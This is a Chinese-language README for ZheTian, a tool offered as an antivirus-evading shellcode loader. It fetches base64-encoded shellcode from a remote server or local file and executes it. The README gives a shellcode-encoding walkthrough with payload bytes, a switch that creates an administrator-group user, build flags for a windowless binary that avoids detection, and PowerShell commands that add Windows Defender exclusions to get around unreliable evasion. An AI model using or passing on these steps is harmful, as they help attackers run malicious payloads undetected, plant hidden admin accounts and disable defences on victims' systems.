![my-logo.png](https://raw.githubusercontent.com/yqcs/ZheTian/master/images/logo.png "my-logo")

# [ZheTian](https://github.com/yqcs/ZheTian/)

## ZheTian Powerful remote load and execute ShellCode tool，ShellCode免杀加载器

### 命令：

> -u  string：从远程服务器加载base64混淆后的字符串。
>
> -r string：从本地文件内读。
>
> -s string：读取无修改的原始文件，只能从本地加载。
>
>-o boolean：向userHome\tmp目录输出一次性可执行文件，体积比主程序小了五六倍，砍去了其他功能，只保留了ShellCode Loader
>
>-n string：向管理员组创建用户，-n的参数即为账户，-p的参数为密码。需以管理员身份运行
>
>-c string：直接从命令行获取base64字符串。如：ZheTian -c ZmM0ODgzZTRmMGU4Yzg4YjUyMjA4YjQyM2M==...
>

## 示例：

### Base64字符串方式加载：

原始python代码：
> buf = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75..."

只需提取数组中的16进制代码：
> \xfc\x48\x83\xe4\xf0\xe8\xc8\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75...
>
然后去除\x，得到：
> fc4883e4f0e8c88b52208b423c4801d0668178180b0275......
>
然后使用base64转码，得到：
> ZmM0ODgzZTRmMGU4Yzg4YjUyMjA4YjQyM2M0ODAxZDA2NjgxNzgxODBiMDI3NQ==
>
c、ruby等同理，Java之流的则是去除  ", 0x"。注意，是逗号空格0x
> byte buf[] = new byte[] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41};
>

获取到base64字符串之后可以选择放到远程服务器加载，使用-u 命令即可。也可以放到本地文件内，或者直接使用-c命令以命令行方式运行。如：ZheTian.exe -c
ZmM0ODgzZTRmMGU4Yzg4YjUyMjA4YjQyM2M0ODAxZDA2NjgxNzgxODBiMDI3NQ==

### 原文件读取类型：

使用 `ZheTian -h `命令可查看支持的语言。推荐使用Java、py、C语言。原文件无需进行任何修改即可直接加载，但是不支持放在远程服务器，只能通过本地 -s
命令读取，如： `ZheTian -s C:/Windows/Temp/payload.java`

### 图示操作过程

先生成64位shellcode

![my-logo.png](https://github.com/yqcs/ZheTian/blob/master/images/payload.jpg "my-logo")

然后根据需要的命令进行修改
![my-logo.png](https://raw.githubusercontent.com/yqcs/ZheTian/master/images/code.png "my-logo")

下面执行示例：
![my-logo.png](https://github.com/yqcs/ZheTian/blob/master/images/c.png "my-logo")

### 编译：

> go build -ldflags "-w -s" -o ZheTian.exe

可以使用
> go build -ldflags "-w -s -H windowsgui" -o ZheTian.exe

实现无窗口运行，但是360偶尔会识别为恶意程序

#### 带图标编译：

> 先执行：go get github.com/akavel/rsrc
>
> rsrc -manifest ZheTian.manifest -ico favicon.ico -o ZheTian.syso
>
>再执行go build -ldflags "-w -s" -o ZheTian.exe
>
> 更多介绍：https://blog.csdn.net/qq_38376348/article/details/108318880
>

## 扩展：windows defender

由于ZheTian的defender免杀效果不稳定，在此推荐一种方式，执行下面命令会分别向defender添加白名单：目录、进程、类型文件

####需以管理员权限运行

> powershell -Command Add-MpPreference -ExclusionPath "C:\tmp"
>
>powershell -Command Add-MpPreference -ExclusionProcess "java.exe"
>
>powershell -Command Add-MpPreference -ExclusionExtension ".java"
>

## 有问题可以提Issues，也可加微信联系

![my-logo.png](https://raw.githubusercontent.com/yqcs/ZheTian/master/images/wx.jpg "my-logo")
